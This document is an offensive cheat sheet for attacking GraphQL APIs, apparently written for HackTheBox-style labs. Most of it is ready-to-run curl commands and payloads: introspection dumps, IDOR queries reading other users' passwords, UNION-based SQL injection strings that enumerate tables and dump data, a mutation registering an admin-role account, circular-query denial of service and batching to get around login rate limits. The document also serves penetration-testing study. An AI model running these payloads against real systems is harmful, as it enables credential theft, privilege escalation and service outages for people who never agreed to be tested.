# Attacking GraphQL Methodology

**Core principle:** GraphQL collapses all operations to a single endpoint. Introspection reveals the full attack surface — types, fields, queries, mutations. Work through: fingerprint → authenticate → enumerate schema → test each attack vector.

---

## Attack Type Quick Reference

| Attack | What to Look For | Goal |
|--------|-----------------|------|
| Information Disclosure | Introspection enabled, sensitive fields in schema | Dump passwords, secrets, tokens |
| IDOR | Queries that take an identifier (username, id) as arg | Access other users' data |
| SQL Injection | String arguments passed unsanitized to SQL | DB exfiltration via UNION |
| Mutation Privilege Escalation | Mutations that accept `role`/`isAdmin` in input | Register admin-role user |
| DoS (circular query) | Circular reference between two types | Crash server |
| Batching brute-force | Array-based batching accepted | Bypass rate limits on login |

---

## Phase 1 — Fingerprint

```bash
# Find the GraphQL endpoint and identify the engine
python3 graphw00f/main.py -d -f -t http://<TARGET>
# Common endpoints: /graphql, /api/graphql, /v1/graphql

# Run automated security config audit
python3 graphql-cop/graphql-cop.py -t http://<TARGET>/graphql

# Check if GraphiQL UI is exposed (browser or curl)
curl -s http://<TARGET>/graphql | grep -i "graphiql\|playground"
```

---

## Phase 2 — Authenticate

```bash
# Find login form action
curl -s http://<TARGET>/ | grep -i "action\|form"

# Login and save session cookie
curl -s -c /tmp/cookies.txt -X POST http://<TARGET>/ \
  -d "username=<USER>&password=<PASS>" -L -o /dev/null

# Decode session to confirm role
cat /tmp/cookies.txt | grep session | awk '{print $7}' | cut -d'.' -f1 | base64 -d 2>/dev/null
```

---

## Phase 3 — Enumerate Schema (Introspection)

Always run introspection authenticated — the authenticated schema may expose types invisible unauthenticated.

```bash
# Step 1: All types (spot custom types — UserObject, SecretObject, etc.)
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool

# Step 2: Fields of a specific type
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"<TYPE>\") { name fields { name type { name kind } } } }"}' \
  | python3 -m json.tool

# Step 3: All available queries
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' \
  | python3 -m json.tool

# Step 4: All mutations and their input args
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}' \
  | python3 -m json.tool

# Step 5: Fields of a mutation input type
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"<InputType>\") { name inputFields { name description defaultValue } } }"}' \
  | python3 -m json.tool
```

Use **GraphQL Voyager** to visualize the schema: paste full introspection JSON → CHANGE SCHEMA → INTROSPECTION → DISPLAY. Look for:
- Circular references between types → DoS vector
- Sensitive fields (password, secret, token, role) → direct exfiltration
- Mutations with role/permission inputs → privilege escalation

---

## Phase 4 — Information Disclosure

```bash
# Query any sensitive field directly — no access control = direct read
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { username password role } }"}' | python3 -m json.tool

# If a custom type has a query (e.g. SecretObject → secrets query)
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ secrets { id secret } }"}' | python3 -m json.tool
```

---

## Phase 5 — IDOR

```bash
# Find queries that take a user identifier argument
# Test with different user's identifier — no error = IDOR confirmed
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(username: \"admin\") { username password role msg } }"}' \
  | python3 -m json.tool

# Confirm query without arg to get error (reveals required arg name)
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ postByAuthor { id title } }"}' | python3 -m json.tool
```

---

## Phase 6 — SQL Injection

```bash
# Confirm SQLi — comment strips rest of WHERE clause
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"htb-stdnt --\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
# Returns normal result → SQLi likely

# Confirm with single quote → SQL error in response
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"htb-stdnt'\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool

# UNION exfiltration — determine column count from object fields (UserObject = 6 columns)
# username = 3rd field = 3rd UNION column = reflected in response

# Enumerate tables
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool

# Enumerate columns of target table
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='<TABLE>'-- -\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool

# Dump data
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(<COLUMN>),4,5,6 FROM <TABLE>-- -\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
```

**Key:** Write complex queries to a file (`/tmp/q.json`) to avoid shell quoting issues. Use `GROUP_CONCAT` to collapse multiple rows.

---

## Phase 7 — Mutation Exploitation

```bash
# Hash password (app uses MD5)
echo -n 'password' | md5sum

# Register admin user — set role: "admin" in input
cat > /tmp/q.json << 'EOF'
{"query":"mutation { registerUser(input: {username: \"pwned\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"owned\"}) { user { username role } } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool

# Login as new admin user
curl -s -c /tmp/admin_cookies.txt -X POST http://<TARGET>/ \
  -d "username=pwned&password=password" -L -o /dev/null

# Access admin endpoint
curl -s -b /tmp/admin_cookies.txt http://<TARGET>/admin | grep -i "htb\|flag"
```

---

## Phase 8 — DoS / Batching

```bash
# Test array-based batching
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(username: \"admin\") { uuid } }"},{"query":"{ post(id: 1) { title } }"}]' \
  | python3 -m json.tool
# Array response → batching enabled

# Circular query DoS (posts → author → posts loop)
# Start shallow to confirm, then deepen to crash
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ posts { author { posts { edges { node { author { username } } } } } } }"}' \
  | python3 -m json.tool
```

---

## Decision Flow

```
Start: found /graphql endpoint
  │
  ├─ Fingerprint engine: graphw00f
  ├─ Run graphql-cop for config issues
  ├─ Login → get session cookie
  │
  ├─ Enumerate types (authenticated)
  │    └─ Custom types visible? → check their fields
  │         └─ Sensitive fields (password, secret)? → query them directly
  │
  ├─ Enumerate queries
  │    ├─ Query takes identifier arg? → test IDOR (try other users)
  │    └─ Query takes string arg? → test SQLi (comment, single quote)
  │         └─ SQLi confirmed → UNION exfiltration
  │              └─ Column count = number of object fields
  │              └─ Reflected column = position of queried field in object
  │
  ├─ Enumerate mutations + input types
  │    └─ Input has role/isAdmin field? → register admin-role user → access /admin
  │
  └─ Check batching
       └─ Send JSON array → array response = batching enabled
```

---

## Universal Rules

1. **Always authenticate before introspection** — some types only appear in authenticated schema
2. **Write complex queries to `/tmp/q.json`** — shell quoting with nested quotes causes failures
3. **Column count for UNION = number of object fields** — count fields from introspection
4. **Reflected column position = field order in object** — `username` is 3rd field → position 3 in UNION
5. **`GROUP_CONCAT` collapses multiple rows** — always use it for table/column enumeration
6. **Always run `graphql-cop`** — gives immediate baseline of misconfigurations
7. **Look for circular type references in Voyager** — `UserObject.posts → PostObject.author` = DoS vector
8. **Decode session cookie** — base64 decode first segment to confirm current role
